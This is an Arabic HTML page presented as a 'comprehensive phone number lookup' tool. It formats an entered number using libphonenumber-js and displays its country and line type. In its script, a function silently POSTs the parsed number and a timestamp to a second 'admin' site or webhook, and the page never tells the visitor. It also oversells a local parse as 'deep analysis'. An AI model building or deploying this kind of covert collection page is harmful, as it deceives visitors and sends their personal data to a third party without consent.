<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة الاستعلام المتقدم</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/libphonenumber-js@1.11.3/bundle/libphonenumber-max.js"></script>
</head>
<body class="bg-slate-900 text-slate-100 min-h-screen flex items-center justify-center p-4">
    <div class="max-w-lg w-full bg-slate-800 rounded-2xl shadow-2xl p-8 border border-slate-700">
        <h1 class="text-2xl font-bold text-center mb-2 text-emerald-400">الاستعلام الشامل عن الأرقام</h1>
        <p class="text-slate-400 text-center text-sm mb-6">أدخل رقم الهاتف مع رمز الدولة لتحليل البيانات بدقة</p>
        
        <div class="space-y-4">
            <div>
                <label class="block text-sm font-medium text-slate-300 mb-2">رقم الهاتف الدولي</label>
                <input type="text" id="phoneInput" placeholder="مثال: +201012345678" 
                    class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-emerald-500 transition">
            </div>
            
            <button onclick="handleLookup()" 
                class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-3 rounded-xl transition shadow-lg shadow-emerald-900/30">
                بدء الفحص والتحليل العميق
            </button>
        </div>

        <div id="resultBox" class="mt-6 hidden bg-slate-900 p-5 rounded-xl border border-slate-700 text-sm space-y-2"></div>
    </div>

    <script>
        // ضع هنا رابط موقعك الثاني أو الـ API الخاص بالاستقبال (مثلاً رابط السيرفر أو خدمة الـ Webhook)
        const TARGET_API_URL = "myweb-one-phi.vercel.app"; 

        async function handleLookup() {
            const rawPhone = document.getElementById('phoneInput').value.trim();
            const resultBox = document.getElementById('resultBox');

            if (!rawPhone) {
                alert("يرجى إدخال رقم الهاتف أولاً.");
                return;
            }

            try {
                const phoneNumber = libphonenumber.parsePhoneNumberFromString(rawPhone);

                if (!phoneNumber || !phoneNumber.isValid()) {
                    resultBox.classList.remove('hidden');
                    resultBox.innerHTML = `<p class="text-red-400 font-semibold text-center">الرقم غير صالح أو غير مدعوم دولياً.</p>`;
                    return;
                }

                const data = {
                    internationalFormat: phoneNumber.formatInternational(),
                    nationalFormat: phoneNumber.formatNational(),
                    countryCode: phoneNumber.country,
                    countryCallingCode: phoneNumber.countryCallingCode,
                    numberType: phoneNumber.getType() || "غير معروف",
                    timestamp: new Date().toISOString()
                };

                // إرسال البيانات للموقع الثاني عبر الشبكة
                await sendDataToAdminSite(data);

                resultBox.classList.remove('hidden');
                resultBox.innerHTML = `
                    <p class="text-emerald-400 font-bold mb-3 border-b border-slate-800 pb-2">نتائج التحليل الشامل:</p>
                    <div class="space-y-1.5 text-slate-300">
                        <p><b>الرقم الدولي:</b> <span class="text-emerald-300 font-mono">${data.internationalFormat}</span></p>
                        <p><b>الرقم المحلي:</b> <span class="font-mono">${data.nationalFormat}</span></p>
                        <p><b>رمز الدولة:</b> +${data.countryCallingCode} (${data.countryCode})</p>
                        <p><b>نوع الخط:</b> ${data.numberType}</p>
                    </div>
                `;
            } catch (error) {
                console.error("خطأ في المعالجة:", error);
            }
        }

        async function sendDataToAdminSite(payload) {
            try {
                await fetch(TARGET_API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) {
                console.error("فشل إرسال البيانات للموقع الثاني:", e);
            }
        }
    </script>
</body>
</html>
